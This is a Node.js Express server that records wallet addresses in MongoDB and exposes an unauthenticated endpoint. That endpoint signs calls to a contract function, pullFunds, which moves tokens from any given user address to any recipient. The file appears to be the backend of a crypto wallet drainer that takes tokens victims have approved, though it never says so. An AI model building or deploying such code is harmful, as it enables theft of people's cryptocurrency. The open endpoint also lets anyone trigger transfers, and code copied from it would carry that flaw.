import express from "express";
import mongoose from "mongoose";
import { ethers } from "ethers";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(express.json());

// -----------------------------
//  CONNECT MONGODB
// -----------------------------
async function connectDB() {
  try {
    await mongoose.connect(process.env.MONGO_URL);
    console.log("MongoDB Connected");
  } catch (err) {
    console.error("MongoDB Connection Failed:", err.message);
  }
}
connectDB();

// -----------------------------
//  USER MODEL
// -----------------------------
const UserSchema = new mongoose.Schema({
  address: { type: String, required: true },
  timestamp: { type: Date, default: Date.now },
});
const UserModel = mongoose.model("User", UserSchema);

// -----------------------------
//  STORE USER
// -----------------------------
app.post("/store-user", async (req, res) => {
  try {
    const { address } = req.body;

    if (!address) return res.json({ success: false, error: "Address required" });

    await UserModel.create({ address });

    res.json({
      success: true,
      message: "Address saved",
      address,
    });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// -----------------------------
//  CONTRACT SETUP
// -----------------------------
let contract;
try {
  const provider = new ethers.JsonRpcProvider(process.env.RPC);
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);

  const abi = [
    "function pullFunds(address token, address user, address recipient, uint256 amount) external"
  ];

  contract = new ethers.Contract(process.env.CONTRACT, abi, wallet);
  console.log("Contract Connected");
} catch (err) {
  console.error("Contract setup failed:", err.message);
}

// -----------------------------
//  RUN CONTRACT
// -----------------------------
app.post("/run-contract", async (req, res) => {
  try {
    const { token, user, recipient, amount } = req.body;

    if (!token || !user || !recipient || !amount)
      return res.json({ success: false, error: "All fields required" });

    const tx = await contract.pullFunds(token, user, recipient, amount);
    await tx.wait();

    res.json({
      success: true,
      message: "Transaction sent",
      hash: tx.hash,
    });
  } catch (err) {
    res.json({ success: false, error: err.message });
  }
});

// -----------------------------
//  START SERVER
// -----------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on PORT ${PORT}`));
